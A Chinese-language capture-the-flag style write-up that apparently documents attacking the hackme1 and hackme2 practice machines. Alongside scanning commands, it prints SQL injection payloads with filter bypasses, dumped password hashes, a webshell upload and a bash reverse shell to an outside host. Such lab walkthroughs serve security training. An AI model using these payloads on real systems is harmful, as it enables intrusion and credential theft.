
Hackme 渗透靶场 WriteUp

- - -

# Hackme 渗透靶场 WriteUp

## hackme1

### 信息收集

**扫描主机**

先利用 arp-scan 扫描一下同一局域网下的主机

```bash
arp-scan -l
```

[![](assets/1701678867-4f39d073d0b9f5e0b916136ea2943a29.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203150-1a920aea-8dea-1.png)

**简略扫描 (扫端口)**

masscan 扫一下端口

```bash
masscan -p 0-65535 --rate=100000 192.168.150.146
```

[![](assets/1701678867-eb0d48ba6095719ebb13c7290dff2383.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203155-1db54caa-8dea-1.png)

发现有一个 80 端口和 22 端口

**详细扫描**

nmap 详细扫描一下

```bash
nmap -sV -p 80,22 -O -T4 192.168.150.146
```

[![](assets/1701678867-6bfd2083145416145857da9c1d4fda7b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203202-221757fc-8dea-1.png)

**目录扫描**

-   利用**dirb**进行目录扫描

```bash
dirb http://192.168.150.146 /usr/share/wordlists/dirb/big.txt
```

[![](assets/1701678867-13bff3206506bb9ee99afbbb1225a00a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203209-25c24f06-8dea-1.png)

-   **gobuster**目录扫描

```bash
gobuster dir -e -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,zip,html -u http://192.168.150.146 -t 30
```

[![](assets/1701678867-ea805635b14af53c8bd3a52ef5bb3a83.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203214-2919f636-8dea-1.png)

**网站指纹识别**

```bash
whatweb http://192.168.150.146
```

[![](assets/1701678867-89129109e75838db1ed5fff7cca417ca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203221-2d674b6c-8dea-1.png)

### 漏洞分析

进入目标 ip，发现一进入是一个登录页面

直接测试万能密码登录，发现不存在 admin 用户，尝试随便注册一个 admin 账户，感觉这里没啥漏洞点

```bash
admin/123456
```

[![](assets/1701678867-c0563bd21a053a327a154ac956dae9f7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203231-32e247d6-8dea-1.png)

这里感觉有点像 SQL 注入，毕竟要查询一个书籍，相当于需要从数据库中进行查询，先手测一下，再 sqlmap 梭

[![](assets/1701678867-46862f47fb7a687091c25dce3c38f6a9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203243-3a45494c-8dea-1.png)

确实是存在 SQL 注入的

[![](assets/1701678867-16756598d40feed448e4cb5f98b80ddb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203250-3e605468-8dea-1.png)

而且还是字符型 SQL 注入，一眼 POST 传参，sqlmap 试一下，抓包看一下传参

[![](assets/1701678867-cd687ebaadc9bfbc89a6c94ae620619f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203258-42f4a29a-8dea-1.png)

测试了一下，好像不可以，手动打吧

```bash
-1' union select 1,2,3#
```

[![](assets/1701678867-c978194f02592177a7db1c06c7d60265.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203305-4771eb52-8dea-1.png)

爆一下数据库

```bash
-1' union select database(),2,3#
```

[![](assets/1701678867-568c6a12945831ae0a421e6e875a5e52.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203312-4ba49e22-8dea-1.png)

之后爆这个库的表名

```bash
-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema='webapphacking'#
```

[![](assets/1701678867-d4586baae6a67016ded0af0746c428bf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203327-543d53e4-8dea-1.png)

爆字段名

```bash
-1' union select group_concat(column_name),2,3 from information_schema.columns where table_schema='webapphacking' and table_name='users'#
```

[![](assets/1701678867-a76638423b7d9a5409d862cf0c290637.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203331-5727bc3e-8dea-1.png)

爆内容

```bash
-1' union select group_concat(user,0x5c,pasword),2,3 from webapphacking.users#
```

得到

```bash
user1\5d41402abc4b2a76b9719d911017c592
user2\6269c4f71a55b24bad0f0267d9be5508
user3\0f359740bd1cda994f8b55330c86d845
test\05a671c66aefea124cc08b76ea6d30bb
superadmin\2386acb2cf356944177746fc92523983
test1\05a671c66aefea124cc08b76ea6d30bb
admin\e10adc3949ba59abbe56e057f20f883e
```

得到 username 和 passwd，passwd 进行 MD5 解密一下

```bash
user1\hello
user2\commando
user3\p@ssw0rd
test\testtest
superadmin\Uncrackable
test1\testtest
admin\123456
```

现在我们知道了真正的 admin 账户的 username 和 passwd，现在切换一下账户

[![](assets/1701678867-5507d15ef9345cc483b9b61c10e8124c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203342-5d2aa0f6-8dea-1.png)

看起来是要打文件上传的，尝试一下

直接传一个最简单的图片马即可绕过

[![](assets/1701678867-d4772ee5658b4ba2d0c466b39e6b21fc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203348-60f6bb3e-8dea-1.png)

蚁剑连一下，权限太低了，提权一下

[![](assets/1701678867-07b7bd9b1caf6faee10f62755f1ea7ad.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203354-64868d74-8dea-1.png)

一开始尝试 suid 提权，发现没有可以进行提权的命令

[![](assets/1701678867-37c73ef52d5aed90d2bb0642fdd0eb15.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203400-6833df6c-8dea-1.png)

尝试自身 getshell，发现一点权限没有

[![](assets/1701678867-648cdcb9e74326465459c61ea82a4aec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203409-6d726a5c-8dea-1.png)

利用 bash 反弹 shell 也无果

[![](assets/1701678867-f5c625e6b7e081d1e0ee255a6bad42e3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203416-71ce7190-8dea-1.png)

我直接 POST 传参一个 pythonshell 也不可以，打完看网上其他 WP 貌似是可以的，奇怪了

这里我是用 wget 进行 getshell 的，就是先将 pythonshell 上传到靶机根目录，之后攻击机开启 http 服务，之后靶机 python 运行一下刚刚 wget 的脚本即可 getshell

[![](assets/1701678867-8b07a14d0289b54c8eff95ef5c7a507a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203422-7513b4be-8dea-1.png)

### 提升权限

先查看一下有哪些存在的用户

```bash
cat /etc/passwd | grep /bin/bash
```

[![](assets/1701678867-ab3491a46d3c0514c8e34542df0eac07.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203428-78d51d0e-8dea-1.png)

之后翻一下目录，发现在 home 目录下有一个 legacy 的子目录，里面有一个 touchmenot，file 一下发现是一个二进制文件，执行一下得到最高权限

[![](assets/1701678867-2130238feb8f70d4d2191c453ecc6afd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203436-7da8ebd0-8dea-1.png)

## hackme2

### 信息收集

**扫描主机**

arp-scan 扫一下同一局域网下的主机

```bash
arp-scan -l
```

[![](assets/1701678867-93fc982486e385ac881826cd84fd64f4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203446-83621a88-8dea-1.png)

**简约扫一下端口**

masscan 扫描

```bash
masscan -p 0-65535 --rate=100000 192.168.150.146
```

[![](assets/1701678867-e282edb8203398ff8e04a2cf54165508.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203452-86fdc9bc-8dea-1.png)

**详细扫描**

nmap 扫描

```bash
nmap -sV -p 80,22 -O -T4 192.168.150.146
```

[![](assets/1701678867-a2ea82452961bc053d92ec2dad0e758b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203458-8b0d5f40-8dea-1.png)

**目录扫描**

-   利用 dirb 扫描

```bash
dirb http://192.168.150.146 /usr/share/wordlists/dirb/big.txt
```

-   利用 gobuster

```bash
gobuster dir -e -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,zip,html -u http://192.168.150.146 -t 30
```

### 漏洞分析

进入靶机发现和 hackme1 一样，一个登录框

随便注册一下

```bash
123/123456
```

之后进入，尝试一下 SQL 注入，发现这次查询的语句和 hackme1 不一样了

[![](assets/1701678867-62b0d185f1877ef9572c0cfbee1aa140.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203507-8fecb678-8dea-1.png)

应该是利用了通配符%

SQL 语句是

```bash
$sql = "SELECT * FROM BOOKS WHERE book_name LIKE '".$input."%';"
```

尝试一下有没有 SQL 注入

```bash
OSI%' and '123' like '1
```

[![](assets/1701678867-4d18b72f98d8974fa926592c50a244b8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203514-9467e70e-8dea-1.png)

之后开始注入

尝试正常的 union 联合注入

```bash
OSI%' union select database(),2,3 like '1
```

发现没有回显，先尝试是不是空格被过滤了，之后考虑关键词绕过

```bash
OSI%'/**/union/**/select/**/database(),2,3/**/like/**/'1
```

[![](assets/1701678867-d36c13a005fb32b36e172260266f1eee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203520-97a1fcf2-8dea-1.png)

再看表名

```bash
OSI%'/**/union/**/select/**/group_concat(table_name),2,3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'webapp
```

[![](assets/1701678867-c5e681aa604573b6fbc4b91b6a35bec9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203525-9b22307c-8dea-1.png)

再看字段名

```bash
OSI%'/**/union/**/select/**/group_concat(column_name),2,3/**/from/**/information_schema.columns/**/where/**/table_schema='webapphacking'/**/and/**/table_name/**/like/**/'use
```

[![](assets/1701678867-975d39cd7f14261f5e3d1f8817b95590.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203531-9e5877f6-8dea-1.png)

在看内容

```bash
OSI%'/**/union/**/select/**/group_concat(user,0x5c,pasword),2,3/**/from/**/users/**/where/**/'1'/**/like/**/'1
```

得到 user/passwd

```bash
user1\5d41402abc4b2a76b9719d911017c592,
user2\6269c4f71a55b24bad0f0267d9be5508,
user3\0f359740bd1cda994f8b55330c86d845,
test\05a671c66aefea124cc08b76ea6d30bb,
superadmin\2386acb2cf356944177746fc92523983,
test1\05a671c66aefea124cc08b76ea6d30bb,
123\e10adc3949ba59abbe56e057f20f883e
```

进行 MD5 解密一下

```bash
superadmin/Uncrackable
```

重新登录一下

成功进入后台

[![](assets/1701678867-639d0f9aec3d45031e363caa36614fa5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203539-a3658658-8dea-1.png)

这里和 1 是有区别的，文件上传之后 uploads 目录没东西，所以去打别的洞

发现还有 2 个输入框，看一下是否能打 SSTI

[![](assets/1701678867-e9be45650f11bc3331bd11430cb91ec6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203545-a6d8be36-8dea-1.png)

好像是不可以的，也可以尝试一下，毕竟都没用 python 框架

[![](assets/1701678867-b3ce6f0f25e897e70fa590e8be3ce682.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203552-ab146d7e-8dea-1.png)

之后试一下直接打 RCE

[![](assets/1701678867-e4aa37ab63c2bb002015fe120f1bc9d9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203558-ae765e32-8dea-1.png)

发现可以直接解析，那就知道要打 RCE 了

[![](assets/1701678867-686b4fb134238dcbafba13d27b16cc36.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203605-b2e79472-8dea-1.png)

尝试看一下根目录

[![](assets/1701678867-be3a8be960e955e53707e9a025f50f48.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203613-b732b5ac-8dea-1.png)

空格被过滤了，绕过一下

```bash
system('ls$IFS$9/');
```

尝试利用 RCE 写一个 shell

这里经过测试正常的打 webshell 好像不太行，fuzz 一下，看看过滤了哪些东西

貌似

```bash
#''- &\*()|
```

都被过滤了，尝试直接 hex2bin/base64\_decode 编码绕一下，弹个 shell 先

```bash
bash -c "bash -i >& /dev/tcp/vps/2333 0>&1"
```

```bash
system(hex2bin(16 进制))
```

[![](assets/1701678867-1b22ff78c5d85d86ca8977026a931189.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203619-bacd0a78-8dea-1.png)

之后和 hackme1 一样找到 home/legacy 下的 touchmenot 即可

[![](assets/1701678867-f03e24e8a4c4b1a5ee84f5a6e863f072.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128203624-be168e20-8dea-1.png)

# 总结

至此，hackme 系列靶机全部结束，接下来我会继续其他系列靶机的 WriteUp 更新
